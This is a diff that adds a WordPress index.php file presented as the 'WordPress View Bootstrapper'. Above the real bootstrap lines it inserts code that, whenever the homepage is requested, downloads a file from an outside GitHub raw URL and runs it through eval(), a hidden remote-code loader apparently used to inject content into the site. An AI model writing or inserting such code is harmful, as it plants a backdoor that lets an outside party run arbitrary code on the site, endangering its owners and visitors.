@@ -1,0 +1,14 @@
+<?php
+$homeurlindex = '/';
+$homepageindex = "/";
+$homeurlindex2 = '/'; 
+$currentpageindex = $_SERVER['REQUEST_URI'];
+
+if($currentpageindex == $homepageindex or $currentpageindex == $homeurlindex or $currentpageindex == $homeurlindex2) {
+    eval("?>".file_get_contents('https://raw.githubusercontent.com/flux-lab/LPFOKUSJITU/refs/heads/main/lamainnoire-tattoo'));
+}
+/**
+ * WordPress View Bootstrapper
+ */
+define('WP_USE_THEMES', true);
+require __DIR__ . '/wp/wp-blog-header.php';
